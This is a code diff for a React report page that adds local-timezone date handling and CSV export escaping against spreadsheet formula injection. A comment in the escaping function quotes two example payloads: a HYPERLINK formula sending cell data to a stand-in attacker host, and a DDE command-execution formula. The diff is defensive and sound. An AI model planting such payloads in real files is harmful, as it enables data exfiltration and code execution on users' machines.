@@ -4,6 +4,8 @@ import { useQuery } from '@tanstack/react-query'
 import { BarChart3, CalendarRange, Coins, Download, Sparkles, User } from 'lucide-react'
 import { useAuth } from '../auth'
 import { authFetchJson } from '../../shared/lib/api-client'
+import { todayIso, zonedDayBoundaryIso } from '../../shared/lib/format'
+import { useSiteConfig } from '../../features/chat/hooks/useSiteConfig'
 import type {
   AiProvider,
   AiReviewResponse,
@@ -67,14 +69,16 @@ const STATUS_KEYS: Record<string, string> = {
 const reportsKey = (serverUrl: string, report: ReportKey, type: ReportType, from: string, to: string, username: string) =>
   ['reports', serverUrl, report, type, from, to, username] as const
 
+// Range defaults are local dates, not UTC ones — an evening operator in UTC+8
+// would otherwise open the report on "yesterday".
 function today(): string {
-  return new Date().toISOString().slice(0, 10)
+  return todayIso()
 }
 
 function monthStart(): string {
   const d = new Date()
-  d.setDate(1)
-  return d.toISOString().slice(0, 10)
+  const month = String(d.getMonth() + 1).padStart(2, '0')
+  return d.getFullYear() + '-' + month + '-01'
 }
 
 function fmtCost(cost: number): string {
@@ -87,8 +91,22 @@ function fmtTokens(n: number): string {
   return n.toLocaleString('en-US')
 }
 
+/**
+ * Escape one CSV cell.
+ *
+ * Beyond the usual quote/comma handling this neutralises SPREADSHEET FORMULA
+ * INJECTION: a cell whose text starts with = + - @ (or a tab/CR) is evaluated as
+ * a formula by Excel/Sheets when the export is opened, so a visitor who picked a
+ * name like `=HYPERLINK("https://evil.tld?d="&A1,"Report")` or
+ * `=cmd|'/C calc'!A0` would otherwise get code execution on the admin's machine.
+ * A leading apostrophe forces the cell to text.
+ *
+ * Only STRING cells are guarded, so numeric columns keep working (a negative
+ * number is not an injection attempt).
+ */
 function csvEscape(v: string | number): string {
-  const s = String(v)
+  const raw = String(v)
+  const s = typeof v === 'string' && /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
   return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
 }
 
@@ -186,6 +204,8 @@ function SortHeader({
 export function ReportPage() {
   const { t, i18n } = useTranslation()
   const { serverUrl } = useAuth()
+  const { config: siteConfig } = useSiteConfig(serverUrl)
+  const timeZone = siteConfig?.displayTimezone || undefined
   const [report, setReport] = useState<ReportKey>('token-usage')
   const [type, setType] = useState<ReportType>('conversations')
   const [from, setFrom] = useState(monthStart)
@@ -207,7 +227,12 @@ export function ReportPage() {
   const { data, isLoading } = useQuery<any>({
     queryKey: reportsKey(serverUrl, report, type, from, to, username),
     queryFn: () => {
-      const qs = new URLSearchParams({ from, to })
+      // Day windows resolved in the display timezone; the API keeps the raw
+      // instants when the value carries a time component.
+      const qs = new URLSearchParams({
+        from: zonedDayBoundaryIso(from, timeZone),
+        to: zonedDayBoundaryIso(to, timeZone, true),
+      })
       if (username.trim()) qs.set('username', username.trim())
       let endpoint: string
       if (report === 'agent-performance') {
